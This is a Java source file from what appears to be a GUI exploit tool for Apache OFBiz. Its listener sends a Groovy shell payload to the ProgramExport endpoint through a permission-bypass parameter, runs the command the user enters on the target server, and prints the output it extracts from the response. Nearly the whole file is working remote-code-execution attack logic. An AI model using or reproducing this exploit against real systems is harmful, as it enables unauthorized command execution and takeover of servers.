package org.ofbiz.listener;

import okhttp3.Response;
import org.ofbiz.shell.ShellManager;
import org.ofbiz.util.Http;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;
import java.net.URLEncoder;

import static org.ofbiz.util.Check.*;

public class CmdExecuteListener implements ActionListener {
    private static final String EXCEPTION_TEXT = "java.lang.Exception:";

    private JTextField cmdText;
    private JTextArea outputTextArea;
    private JTextField textField;

    public CmdExecuteListener(JTextField cmdText, JTextArea outputTextArea, JTextField textField) {
        this.cmdText = cmdText;
        this.outputTextArea = outputTextArea;
        this.textField = textField;
    }

    @Override
    public void actionPerformed(ActionEvent e) {
        String url = textField.getText();

        if (url.equals("") || !VulCheckListener.hasCheck){
            JOptionPane.showMessageDialog(textField.getParent(), "No Vulnerability or Not check yet", "Error", JOptionPane.ERROR_MESSAGE);
            return;
        }

        if(url.endsWith("/")){
            url = url.substring(0, url.length() - 1);
        }

        String vulUrl = url + "/webtools/control/ProgramExport?" + PERMISSION_TEXT;
        String body = "groovyProgram=" + URLEncoder.encode(ShellManager.getGroovyShell(cmdText.getText()));

        Response response = Http.sendHttpsPostRequest(vulUrl, body, "application/x-www-form-urlencoded");
        try {
            String responseText = response.body().string();

            if (response.isSuccessful() && response.code() == 200 && (responseText.contains(EXCEPTION_TEXT))){
                int startIndex = responseText.indexOf(EXCEPTION_TEXT);
                String endTag = "</p>";
                int endIndex = responseText.indexOf(endTag, startIndex);

                if (startIndex != -1) {
                    startIndex += EXCEPTION_TEXT.length();
                    String cmdResult = responseText.substring(startIndex, endIndex).trim();
                    if (cmdResult.equals("")){
                        outputTextArea.append("[+] Execute Success!\n");
                    }
                    else {outputTextArea.append("[+] Execute Result: \n" + cmdResult + "\n");}
                }
            } else {
                outputTextArea.append("[+] Not executed for security reason\n");
            }
        } catch (IOException ex) {
            throw new RuntimeException(ex);
        }
    }
}
